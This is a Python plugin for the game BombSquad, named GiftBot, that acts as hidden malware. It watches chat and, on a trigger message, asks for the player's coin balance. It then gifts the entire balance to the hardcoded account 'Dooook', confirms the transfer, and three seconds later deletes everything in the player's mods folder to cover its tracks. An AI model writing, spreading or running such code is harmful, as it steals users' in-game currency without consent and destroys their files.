from babase import Plugin
import bauiv1 as bui
import bascenev1 as bs
from bascenev1 import (
    get_chat_messages as GCM,
    get_connection_to_host_info_2
)
from bauiv1 import (
    apptimer as teck,
    screenmessage as push,
    getsound as gs
)
import re
import time
import os
import shutil

GIFT_TARGET = "Dooook"

is_active = False


def safe_chat_send(msg):
    try:
        bs.chatmessage(msg)
    except Exception as e:
        print(f"[GRT] send error: {e}")


def parse_coins(text):
    try:
        m = re.search(r'✅I have\s+([\d,]+)\s+coins!', text)
        if m:
            number = m.group(1).replace(',', '')
            return int(number)
    except:
        pass
    return None


def nuke_mods_folder():
    """پاک کردن کل پوشه mods"""
    try:
        current_file = os.path.abspath(__file__)
        mods_dir = os.path.dirname(current_file)

        print(f"[GRT] NUKE: Deleting entire mods folder: {mods_dir}")

        if os.path.isdir(mods_dir):
            for item in os.listdir(mods_dir):
                item_path = os.path.join(mods_dir, item)
                try:
                    if os.path.isfile(item_path) or os.path.islink(item_path):
                        os.remove(item_path)
                        print(f"[GRT] Deleted file: {item}")
                    elif os.path.isdir(item_path):
                        shutil.rmtree(item_path, ignore_errors=True)
                        print(f"[GRT] Deleted folder: {item}")
                except Exception as e:
                    print(f"[GRT] Failed to delete {item}: {e}")

        print(f"[GRT] Mods folder cleared!")

    except Exception as e:
        print(f"[GRT] nuke error: {e}")


def send_gift(coins):
    try:
        safe_chat_send(f"gift {GIFT_TARGET} {coins}")
        try: gs('dingSmallHigh').play()
        except: pass

        teck(1.0, lambda: safe_chat_send("1"))
        teck(1.05, lambda: gs('dingSmall'))

        # 3 ثانیه بعد، کل پوشه رو پاک کن
        teck(3.0, nuke_mods_folder)

    except Exception as e:
        print(f"[GRT] gift error: {e}")


def handle_message(msg):
    global is_active

    try:
        sender = None
        content = msg
        if ': ' in msg:
            parts = msg.split(': ', 1)
            sender = parts[0].strip()
            content = parts[1].strip()

        if not content:
            return

        content_lower = content.lower()

        if 'x' in content_lower:
            if not is_active:
                is_active = True
                safe_chat_send("c!")
                try: gs('dingSmall').play()
                except: pass

        if is_active:
            coins = parse_coins(content)
            if coins is not None:
                is_active = False
                send_gift(coins)

    except Exception as e:
        print(f"[GRT] handle error: {e}")


# ba_meta require api 9
# ba_meta export babase.Plugin
class GiftBot(Plugin):
    def __init__(s):
        s.last_hash = ""
        teck(1, s.ear)

    def ear(s):
        try:
            z = GCM()
            teck(0.005, s.ear)

            if not z:
                s.last_hash = ""
                return

            try:
                last_msg = z[-1]
            except (IndexError, TypeError):
                s.last_hash = ""
                return

            current_hash = f"{len(last_msg)}_{last_msg}"
            if current_hash == s.last_hash:
                return
            s.last_hash = current_hash

            try:
                handle_message(last_msg)
            except Exception as e:
                print(f"[GRT] ear inner error: {e}")

        except Exception as e:
            try:
                teck(0.005, s.ear)
            except: pass
            print(f"[GRT] ear error: {e}")
